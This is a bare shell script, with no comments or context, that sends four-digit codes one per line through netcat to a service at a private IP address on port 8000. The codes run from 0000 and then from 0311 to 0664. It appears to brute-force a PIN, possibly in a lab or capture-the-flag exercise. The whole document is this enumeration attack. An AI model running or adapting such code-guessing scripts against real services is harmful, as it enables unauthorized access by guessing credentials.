echo 0000 | nc 10.212.175.197 8000
echo 0311 | nc 10.212.175.197 8000
echo 0312 | nc 10.212.175.197 8000
echo 0313 | nc 10.212.175.197 8000
echo 0314 | nc 10.212.175.197 8000
echo 0315 | nc 10.212.175.197 8000
echo 0316 | nc 10.212.175.197 8000
echo 0317 | nc 10.212.175.197 8000
echo 0318 | nc 10.212.175.197 8000
echo 0319 | nc 10.212.175.197 8000
echo 0320 | nc 10.212.175.197 8000
echo 0321 | nc 10.212.175.197 8000
echo 0322 | nc 10.212.175.197 8000
echo 0323 | nc 10.212.175.197 8000
echo 0324 | nc 10.212.175.197 8000
echo 0325 | nc 10.212.175.197 8000
echo 0326 | nc 10.212.175.197 8000
echo 0327 | nc 10.212.175.197 8000
echo 0328 | nc 10.212.175.197 8000
echo 0329 | nc 10.212.175.197 8000
echo 0330 | nc 10.212.175.197 8000
echo 0331 | nc 10.212.175.197 8000
echo 0332 | nc 10.212.175.197 8000
echo 0333 | nc 10.212.175.197 8000
echo 0334 | nc 10.212.175.197 8000
echo 0335 | nc 10.212.175.197 8000
echo 0336 | nc 10.212.175.197 8000
echo 0337 | nc 10.212.175.197 8000
echo 0338 | nc 10.212.175.197 8000
echo 0339 | nc 10.212.175.197 8000
echo 0340 | nc 10.212.175.197 8000
echo 0341 | nc 10.212.175.197 8000
echo 0342 | nc 10.212.175.197 8000
echo 0343 | nc 10.212.175.197 8000
echo 0344 | nc 10.212.175.197 8000
echo 0345 | nc 10.212.175.197 8000
echo 0346 | nc 10.212.175.197 8000
echo 0347 | nc 10.212.175.197 8000
echo 0348 | nc 10.212.175.197 8000
echo 0349 | nc 10.212.175.197 8000
echo 0350 | nc 10.212.175.197 8000
echo 0351 | nc 10.212.175.197 8000
echo 0352 | nc 10.212.175.197 8000
echo 0353 | nc 10.212.175.197 8000
echo 0354 | nc 10.212.175.197 8000
echo 0355 | nc 10.212.175.197 8000
echo 0356 | nc 10.212.175.197 8000
echo 0357 | nc 10.212.175.197 8000
echo 0358 | nc 10.212.175.197 8000
echo 0359 | nc 10.212.175.197 8000
echo 0360 | nc 10.212.175.197 8000
echo 0361 | nc 10.212.175.197 8000
echo 0362 | nc 10.212.175.197 8000
echo 0363 | nc 10.212.175.197 8000
echo 0364 | nc 10.212.175.197 8000
echo 0365 | nc 10.212.175.197 8000
echo 0366 | nc 10.212.175.197 8000
echo 0367 | nc 10.212.175.197 8000
echo 0368 | nc 10.212.175.197 8000
echo 0369 | nc 10.212.175.197 8000
echo 0370 | nc 10.212.175.197 8000
echo 0371 | nc 10.212.175.197 8000
echo 0372 | nc 10.212.175.197 8000
echo 0373 | nc 10.212.175.197 8000
echo 0374 | nc 10.212.175.197 8000
echo 0375 | nc 10.212.175.197 8000
echo 0376 | nc 10.212.175.197 8000
echo 0377 | nc 10.212.175.197 8000
echo 0378 | nc 10.212.175.197 8000
echo 0379 | nc 10.212.175.197 8000
echo 0380 | nc 10.212.175.197 8000
echo 0381 | nc 10.212.175.197 8000
echo 0382 | nc 10.212.175.197 8000
echo 0383 | nc 10.212.175.197 8000
echo 0384 | nc 10.212.175.197 8000
echo 0385 | nc 10.212.175.197 8000
echo 0386 | nc 10.212.175.197 8000
echo 0387 | nc 10.212.175.197 8000
echo 0388 | nc 10.212.175.197 8000
echo 0389 | nc 10.212.175.197 8000
echo 0390 | nc 10.212.175.197 8000
echo 0391 | nc 10.212.175.197 8000
echo 0392 | nc 10.212.175.197 8000
echo 0393 | nc 10.212.175.197 8000
echo 0394 | nc 10.212.175.197 8000
echo 0395 | nc 10.212.175.197 8000
echo 0396 | nc 10.212.175.197 8000
echo 0397 | nc 10.212.175.197 8000
echo 0398 | nc 10.212.175.197 8000
echo 0399 | nc 10.212.175.197 8000
echo 0400 | nc 10.212.175.197 8000
echo 0401 | nc 10.212.175.197 8000
echo 0402 | nc 10.212.175.197 8000
echo 0403 | nc 10.212.175.197 8000
echo 0404 | nc 10.212.175.197 8000
echo 0405 | nc 10.212.175.197 8000
echo 0406 | nc 10.212.175.197 8000
echo 0407 | nc 10.212.175.197 8000
echo 0408 | nc 10.212.175.197 8000
echo 0409 | nc 10.212.175.197 8000
echo 0410 | nc 10.212.175.197 8000
echo 0411 | nc 10.212.175.197 8000
echo 0412 | nc 10.212.175.197 8000
echo 0413 | nc 10.212.175.197 8000
echo 0414 | nc 10.212.175.197 8000
echo 0415 | nc 10.212.175.197 8000
echo 0416 | nc 10.212.175.197 8000
echo 0417 | nc 10.212.175.197 8000
echo 0418 | nc 10.212.175.197 8000
echo 0419 | nc 10.212.175.197 8000
echo 0420 | nc 10.212.175.197 8000
echo 0421 | nc 10.212.175.197 8000
echo 0422 | nc 10.212.175.197 8000
echo 0423 | nc 10.212.175.197 8000
echo 0424 | nc 10.212.175.197 8000
echo 0425 | nc 10.212.175.197 8000
echo 0426 | nc 10.212.175.197 8000
echo 0427 | nc 10.212.175.197 8000
echo 0428 | nc 10.212.175.197 8000
echo 0429 | nc 10.212.175.197 8000
echo 0430 | nc 10.212.175.197 8000
echo 0431 | nc 10.212.175.197 8000
echo 0432 | nc 10.212.175.197 8000
echo 0433 | nc 10.212.175.197 8000
echo 0434 | nc 10.212.175.197 8000
echo 0435 | nc 10.212.175.197 8000
echo 0436 | nc 10.212.175.197 8000
echo 0437 | nc 10.212.175.197 8000
echo 0438 | nc 10.212.175.197 8000
echo 0439 | nc 10.212.175.197 8000
echo 0440 | nc 10.212.175.197 8000
echo 0441 | nc 10.212.175.197 8000
echo 0442 | nc 10.212.175.197 8000
echo 0443 | nc 10.212.175.197 8000
echo 0444 | nc 10.212.175.197 8000
echo 0445 | nc 10.212.175.197 8000
echo 0446 | nc 10.212.175.197 8000
echo 0447 | nc 10.212.175.197 8000
echo 0448 | nc 10.212.175.197 8000
echo 0449 | nc 10.212.175.197 8000
echo 0450 | nc 10.212.175.197 8000
echo 0451 | nc 10.212.175.197 8000
echo 0452 | nc 10.212.175.197 8000
echo 0453 | nc 10.212.175.197 8000
echo 0454 | nc 10.212.175.197 8000
echo 0455 | nc 10.212.175.197 8000
echo 0456 | nc 10.212.175.197 8000
echo 0457 | nc 10.212.175.197 8000
echo 0458 | nc 10.212.175.197 8000
echo 0459 | nc 10.212.175.197 8000
echo 0460 | nc 10.212.175.197 8000
echo 0461 | nc 10.212.175.197 8000
echo 0462 | nc 10.212.175.197 8000
echo 0463 | nc 10.212.175.197 8000
echo 0464 | nc 10.212.175.197 8000
echo 0465 | nc 10.212.175.197 8000
echo 0466 | nc 10.212.175.197 8000
echo 0467 | nc 10.212.175.197 8000
echo 0468 | nc 10.212.175.197 8000
echo 0469 | nc 10.212.175.197 8000
echo 0470 | nc 10.212.175.197 8000
echo 0471 | nc 10.212.175.197 8000
echo 0472 | nc 10.212.175.197 8000
echo 0473 | nc 10.212.175.197 8000
echo 0474 | nc 10.212.175.197 8000
echo 0475 | nc 10.212.175.197 8000
echo 0476 | nc 10.212.175.197 8000
echo 0477 | nc 10.212.175.197 8000
echo 0478 | nc 10.212.175.197 8000
echo 0479 | nc 10.212.175.197 8000
echo 0480 | nc 10.212.175.197 8000
echo 0481 | nc 10.212.175.197 8000
echo 0482 | nc 10.212.175.197 8000
echo 0483 | nc 10.212.175.197 8000
echo 0484 | nc 10.212.175.197 8000
echo 0485 | nc 10.212.175.197 8000
echo 0486 | nc 10.212.175.197 8000
echo 0487 | nc 10.212.175.197 8000
echo 0488 | nc 10.212.175.197 8000
echo 0489 | nc 10.212.175.197 8000
echo 0490 | nc 10.212.175.197 8000
echo 0491 | nc 10.212.175.197 8000
echo 0492 | nc 10.212.175.197 8000
echo 0493 | nc 10.212.175.197 8000
echo 0494 | nc 10.212.175.197 8000
echo 0495 | nc 10.212.175.197 8000
echo 0496 | nc 10.212.175.197 8000
echo 0497 | nc 10.212.175.197 8000
echo 0498 | nc 10.212.175.197 8000
echo 0499 | nc 10.212.175.197 8000
echo 0500 | nc 10.212.175.197 8000
echo 0501 | nc 10.212.175.197 8000
echo 0502 | nc 10.212.175.197 8000
echo 0503 | nc 10.212.175.197 8000
echo 0504 | nc 10.212.175.197 8000
echo 0505 | nc 10.212.175.197 8000
echo 0506 | nc 10.212.175.197 8000
echo 0507 | nc 10.212.175.197 8000
echo 0508 | nc 10.212.175.197 8000
echo 0509 | nc 10.212.175.197 8000
echo 0510 | nc 10.212.175.197 8000
echo 0511 | nc 10.212.175.197 8000
echo 0512 | nc 10.212.175.197 8000
echo 0513 | nc 10.212.175.197 8000
echo 0514 | nc 10.212.175.197 8000
echo 0515 | nc 10.212.175.197 8000
echo 0516 | nc 10.212.175.197 8000
echo 0517 | nc 10.212.175.197 8000
echo 0518 | nc 10.212.175.197 8000
echo 0519 | nc 10.212.175.197 8000
echo 0520 | nc 10.212.175.197 8000
echo 0521 | nc 10.212.175.197 8000
echo 0522 | nc 10.212.175.197 8000
echo 0523 | nc 10.212.175.197 8000
echo 0524 | nc 10.212.175.197 8000
echo 0525 | nc 10.212.175.197 8000
echo 0526 | nc 10.212.175.197 8000
echo 0527 | nc 10.212.175.197 8000
echo 0528 | nc 10.212.175.197 8000
echo 0529 | nc 10.212.175.197 8000
echo 0530 | nc 10.212.175.197 8000
echo 0531 | nc 10.212.175.197 8000
echo 0532 | nc 10.212.175.197 8000
echo 0533 | nc 10.212.175.197 8000
echo 0534 | nc 10.212.175.197 8000
echo 0535 | nc 10.212.175.197 8000
echo 0536 | nc 10.212.175.197 8000
echo 0537 | nc 10.212.175.197 8000
echo 0538 | nc 10.212.175.197 8000
echo 0539 | nc 10.212.175.197 8000
echo 0540 | nc 10.212.175.197 8000
echo 0541 | nc 10.212.175.197 8000
echo 0542 | nc 10.212.175.197 8000
echo 0543 | nc 10.212.175.197 8000
echo 0544 | nc 10.212.175.197 8000
echo 0545 | nc 10.212.175.197 8000
echo 0546 | nc 10.212.175.197 8000
echo 0547 | nc 10.212.175.197 8000
echo 0548 | nc 10.212.175.197 8000
echo 0549 | nc 10.212.175.197 8000
echo 0550 | nc 10.212.175.197 8000
echo 0551 | nc 10.212.175.197 8000
echo 0552 | nc 10.212.175.197 8000
echo 0553 | nc 10.212.175.197 8000
echo 0554 | nc 10.212.175.197 8000
echo 0555 | nc 10.212.175.197 8000
echo 0556 | nc 10.212.175.197 8000
echo 0557 | nc 10.212.175.197 8000
echo 0558 | nc 10.212.175.197 8000
echo 0559 | nc 10.212.175.197 8000
echo 0560 | nc 10.212.175.197 8000
echo 0561 | nc 10.212.175.197 8000
echo 0562 | nc 10.212.175.197 8000
echo 0563 | nc 10.212.175.197 8000
echo 0564 | nc 10.212.175.197 8000
echo 0565 | nc 10.212.175.197 8000
echo 0566 | nc 10.212.175.197 8000
echo 0567 | nc 10.212.175.197 8000
echo 0568 | nc 10.212.175.197 8000
echo 0569 | nc 10.212.175.197 8000
echo 0570 | nc 10.212.175.197 8000
echo 0571 | nc 10.212.175.197 8000
echo 0572 | nc 10.212.175.197 8000
echo 0573 | nc 10.212.175.197 8000
echo 0574 | nc 10.212.175.197 8000
echo 0575 | nc 10.212.175.197 8000
echo 0576 | nc 10.212.175.197 8000
echo 0577 | nc 10.212.175.197 8000
echo 0578 | nc 10.212.175.197 8000
echo 0579 | nc 10.212.175.197 8000
echo 0580 | nc 10.212.175.197 8000
echo 0581 | nc 10.212.175.197 8000
echo 0582 | nc 10.212.175.197 8000
echo 0583 | nc 10.212.175.197 8000
echo 0584 | nc 10.212.175.197 8000
echo 0585 | nc 10.212.175.197 8000
echo 0586 | nc 10.212.175.197 8000
echo 0587 | nc 10.212.175.197 8000
echo 0588 | nc 10.212.175.197 8000
echo 0589 | nc 10.212.175.197 8000
echo 0590 | nc 10.212.175.197 8000
echo 0591 | nc 10.212.175.197 8000
echo 0592 | nc 10.212.175.197 8000
echo 0593 | nc 10.212.175.197 8000
echo 0594 | nc 10.212.175.197 8000
echo 0595 | nc 10.212.175.197 8000
echo 0596 | nc 10.212.175.197 8000
echo 0597 | nc 10.212.175.197 8000
echo 0598 | nc 10.212.175.197 8000
echo 0599 | nc 10.212.175.197 8000
echo 0600 | nc 10.212.175.197 8000
echo 0601 | nc 10.212.175.197 8000
echo 0602 | nc 10.212.175.197 8000
echo 0603 | nc 10.212.175.197 8000
echo 0604 | nc 10.212.175.197 8000
echo 0605 | nc 10.212.175.197 8000
echo 0606 | nc 10.212.175.197 8000
echo 0607 | nc 10.212.175.197 8000
echo 0608 | nc 10.212.175.197 8000
echo 0609 | nc 10.212.175.197 8000
echo 0610 | nc 10.212.175.197 8000
echo 0611 | nc 10.212.175.197 8000
echo 0612 | nc 10.212.175.197 8000
echo 0613 | nc 10.212.175.197 8000
echo 0614 | nc 10.212.175.197 8000
echo 0615 | nc 10.212.175.197 8000
echo 0616 | nc 10.212.175.197 8000
echo 0617 | nc 10.212.175.197 8000
echo 0618 | nc 10.212.175.197 8000
echo 0619 | nc 10.212.175.197 8000
echo 0620 | nc 10.212.175.197 8000
echo 0621 | nc 10.212.175.197 8000
echo 0622 | nc 10.212.175.197 8000
echo 0623 | nc 10.212.175.197 8000
echo 0624 | nc 10.212.175.197 8000
echo 0625 | nc 10.212.175.197 8000
echo 0626 | nc 10.212.175.197 8000
echo 0627 | nc 10.212.175.197 8000
echo 0628 | nc 10.212.175.197 8000
echo 0629 | nc 10.212.175.197 8000
echo 0630 | nc 10.212.175.197 8000
echo 0631 | nc 10.212.175.197 8000
echo 0632 | nc 10.212.175.197 8000
echo 0633 | nc 10.212.175.197 8000
echo 0634 | nc 10.212.175.197 8000
echo 0635 | nc 10.212.175.197 8000
echo 0636 | nc 10.212.175.197 8000
echo 0637 | nc 10.212.175.197 8000
echo 0638 | nc 10.212.175.197 8000
echo 0639 | nc 10.212.175.197 8000
echo 0640 | nc 10.212.175.197 8000
echo 0641 | nc 10.212.175.197 8000
echo 0642 | nc 10.212.175.197 8000
echo 0643 | nc 10.212.175.197 8000
echo 0644 | nc 10.212.175.197 8000
echo 0645 | nc 10.212.175.197 8000
echo 0646 | nc 10.212.175.197 8000
echo 0647 | nc 10.212.175.197 8000
echo 0648 | nc 10.212.175.197 8000
echo 0649 | nc 10.212.175.197 8000
echo 0650 | nc 10.212.175.197 8000
echo 0651 | nc 10.212.175.197 8000
echo 0652 | nc 10.212.175.197 8000
echo 0653 | nc 10.212.175.197 8000
echo 0654 | nc 10.212.175.197 8000
echo 0655 | nc 10.212.175.197 8000
echo 0656 | nc 10.212.175.197 8000
echo 0657 | nc 10.212.175.197 8000
echo 0658 | nc 10.212.175.197 8000
echo 0659 | nc 10.212.175.197 8000
echo 0660 | nc 10.212.175.197 8000
echo 0661 | nc 10.212.175.197 8000
echo 0662 | nc 10.212.175.197 8000
echo 0663 | nc 10.212.175.197 8000
echo 0664 | nc 10.212.175.197 8000
